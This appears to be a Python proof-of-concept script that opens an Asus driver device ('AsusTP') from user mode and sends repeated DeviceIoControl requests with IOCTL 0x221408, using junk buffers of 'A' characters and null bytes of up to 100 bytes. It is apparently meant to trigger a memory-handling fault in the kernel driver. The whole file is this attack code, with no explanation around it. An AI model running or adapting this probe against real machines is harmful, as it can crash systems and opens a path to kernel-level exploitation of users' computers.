import ctypes, sys
from ctypes import *
import io
from itertools import product
from sys import argv

devicename = "AsusTP"



ioctl = 0x221408


kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\AsusTP", 0xC0000000, 0, None, 0x3, 0, None) 

if not hevDevice or hevDevice == -1:
    print ("Not Win! Sorry!")

else:
    print ("OPENED!")
                    
    buf = 'A' * 10
    bufLength = len(buf)
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)

    buf = '\x00' * 10
    bufLength = len(buf)
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)

    buf = 'A' * 10
    bufLength = len(buf)
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)

    buf = 'A' * 10
    bufLength = len(buf)
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)

    
    buf = 'A' * 100
    bufLength = len(buf)
    
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)


